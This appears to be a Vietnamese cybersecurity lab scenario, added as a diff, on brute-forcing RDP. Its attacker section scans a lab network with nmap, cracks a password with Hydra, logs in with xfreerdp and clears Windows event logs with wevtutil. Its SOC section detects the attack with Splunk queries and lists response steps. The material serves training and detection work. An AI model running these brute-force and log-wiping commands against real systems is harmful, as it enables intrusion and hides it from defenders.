@@ -1,0 +1,171 @@
+================================================================
+KỊCH BẢN: RDP HUNT - TẤN CÔNG VÀ PHÁT HIỆN BRUTE-FORCE RDP
+================================================================
+
+1. HACKER (TẤN CÔNG)
+================================================================
+
+B1: Kiểm tra địa chỉ IP của máy tấn công (Kali Linux)
+Lệnh:
+  hostname -I
+
+Kết quả:
+  IP của hacker: 192.168.188.128
+
+
+B2: Quét mạng để phát hiện thiết bị
+Lệnh:
+  nmap -sn 192.168.188.0/24
+
+Kết quả:
+  Phát hiện máy nạn nhân:
+  - IPv4: 192.168.188.129
+  - MAC: 00:0C:29:F0:EE:22 (VMware)
+
+
+B3: Quét 100 cổng phổ biến của máy nạn nhân
+Lệnh:
+  nmap -F 192.168.188.129
+
+Kết quả:
+  - Cổng 3389 (RDP) đang mở → Có thể tấn công.
+
+
+B4: Tấn công brute-force RDP bằng Hydra
+Lệnh:
+  hydra -l trungdh -P passwords.txt rdp://192.168.188.129
+
+Kết quả:
+  [3389][rdp] host: 192.168.188.129 login: trungdh password: 123456
+  → Brute-force thành công!
+
+
+B5: Đăng nhập RDP vào máy nạn nhân
+Lệnh:
+  xfreerdp /v:192.168.188.129 /u:trungdh /p:123456
+
+Kết quả:
+  Đăng nhập thành công vào máy nạn nhân.
+
+
+B6: Tải file hacked.txt từ Kali sang máy nạn nhân
+Lệnh (trên Kali):
+  copy hacked.txt -> C:\Users\TrungDH\Documents\
+
+Hành động:
+  - Sao chép file `hacked.txt` vào thư mục Documents của user `trungdh`.
+
+
+B7: Xóa log để che dấu vết
+Lệnh (trên máy nạn nhân, CMD Admin):
+  wevtutil cl Security
+  wevtutil cl System
+  wevtutil cl Application
+
+Kết quả:
+  - Security Log đã bị xóa.
+  - System Log đã bị xóa.
+  - Application Log đã bị xóa.
+
+
+B8: Đăng xuất khỏi máy nạn nhân
+Lệnh:
+  logoff
+
+Kết quả:
+  - Hacker đã rời khỏi phiên RDP.
+
+
+
+================================================================
+2. SOC ANALYST (ĐIỀU TRA VÀ ỨNG PHÓ)
+================================================================
+
+2.1. Thu thập log
+- Kiểm tra Splunk Forwarder đã nhận log từ máy nạn nhân chưa.
+- Xác nhận dữ liệu đã về Splunk.
+
+Truy vấn kiểm tra:
+  index=main
+  | stats count by host
+
+Kết quả mong đợi:
+  - host=DESKTOP-IUKE6AK đã xuất hiện.
+
+
+2.2. Phát hiện bất thường
+a) Tìm sự kiện đăng nhập RDP thành công (EventCode 4624)
+Truy vấn SPL:
+  index=main EventCode=4624
+  | table _time, Logon_Type, ComputerName
+  | sort - _time
+
+Kết luận:
+  - Logon_Type=10: Đăng nhập qua RDP (RemoteInteractive).
+  - Logon_Type=3: Đăng nhập qua mạng (Network).
+
+
+b) Xác định IP của hacker (từ đăng nhập thành công)
+Truy vấn SPL:
+  index=main EventCode=4624 ComputerName="DESKTOP-IUKE6AK"
+  | table _time, Logon_Type, ComputerName, src_ip
+  | sort - _time
+
+Kết luận:
+  - Phát hiện 2 sự kiện đăng nhập thành công:
+    + Logon_Type=3 (Network) → Có thể từ Hydra.
+    + Logon_Type=10 (RDP) → Xác nhận hacker đã đăng nhập bằng RDP.
+  - IP nguồn: 192.168.188.128 (Kali).
+
+
+c) Phát hiện brute-force (nhiều lần đăng nhập thất bại)
+Truy vấn SPL:
+  index=main EventCode=4625
+  | table _time, EventCode, Logon_Type
+  | sort - _time
+
+Kết luận:
+  - Có 50 sự kiện đăng nhập thất bại (4625) trong khoảng 2 phút.
+  - Đây là dấu hiệu của tấn công brute-force.
+
+
+d) Kiểm tra log có bị xóa không (EventCode 1102)
+Truy vấn SPL:
+  index=main EventCode=1102
+
+Kết luận:
+  - Phát hiện sự kiện Security Log bị xóa.
+  - Hacker đã xóa log sau khi thực hiện các thao tác.
+
+
+KẾT LUẬN CHUNG:
+- Kẻ tấn công đã thực hiện brute-force RDP và thành công.
+- Đã đăng nhập vào máy nạn nhân, thực hiện các thao tác.
+- Sau khi thao tác, hacker đã xóa Security Log.
+- Cần kiểm tra trực tiếp trên máy nạn nhân để xác định hoạt động cụ thể.
+
+
+2.3. Ứng phó sự cố (Incident Response)
+a) Kết nối vào máy nạn nhân:
+  - Sử dụng RDP hoặc đăng nhập trực tiếp.
+
+b) Điều tra hoạt động sau xâm nhập:
+  - Tìm file `hacked.txt` tại C:\Users\TrungDH\Documents\
+  - Kiểm tra lịch sử lệnh:
+    + CMD: doskey /history
+    + PowerShell: type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+  - Kiểm tra tiến trình lạ:
+    + tasklist /v
+  - Kiểm tra kết nối mạng:
+    + netstat -anob
+
+c) Xử lý hậu quả:
+  - Xóa file `hacked.txt`.
+  - Đổi mật khẩu user `trungdh`.
+  - Chặn IP 192.168.188.128 trên Firewall (tùy chọn).
+
+
+================================================================
+NGÀY THỰC HIỆN: 14/08/2026
+NGƯỜI THỰC HIỆN: Đỗ Hữu Trung
+================================================================
